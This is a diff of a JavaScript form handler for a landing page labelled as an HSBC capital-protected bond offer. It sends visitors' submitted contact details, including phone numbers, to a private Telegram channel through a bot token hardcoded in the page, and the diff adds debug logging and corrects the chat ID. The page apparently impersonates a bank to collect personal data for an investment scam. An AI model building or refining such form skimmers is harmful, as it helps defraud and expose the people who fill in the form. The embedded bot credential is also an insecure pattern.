@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
     const form = document.querySelector('.investment-form');
     const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
-    const CHAT_ID = '-1001002416566645';
+    const CHAT_ID = '-1002416566645';
 
     // Phone validation function
     function isValidPhone(countryCode, phone) {
@@ -91,10 +91,13 @@ document.addEventListener('DOMContentLoaded', function() {
 📱 Phone: ${countryCode}${phoneNumber}
 
 From: HSBC Capital Protected Bond Landing Page
-        `;
+        `.trim();
+
+        console.log('Attempting to send message to Telegram...'); // Debug log
+        console.log('Channel ID:', CHAT_ID); // Debug log
 
         try {
-            // Try with the full channel ID format
+            console.log('Sending request to Telegram API...'); // Debug log
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -102,22 +105,24 @@ From: HSBC Capital Protected Bond Landing Page
                 },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
-                    disable_web_page_preview: true
+                    text: message
                 })
             });
 
+            console.log('Raw response:', response); // Debug log
             const data = await response.json();
-            console.log('Telegram Response:', data); // For debugging
+            console.log('Telegram API response:', data); // Debug log
 
             if (data.ok) {
+                console.log('Message sent successfully!'); // Debug log
                 form.reset();
                 alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
             } else {
-                throw new Error(data.description || 'Failed to send message');
+                console.error('Telegram API error:', data); // Debug log
+                throw new Error(`Telegram API error: ${data.description}`);
             }
         } catch (error) {
-            console.error('Error:', error);
+            console.error('Detailed error:', error); // Debug log
             alert('Something went wrong. Please try again later.');
         }
     });
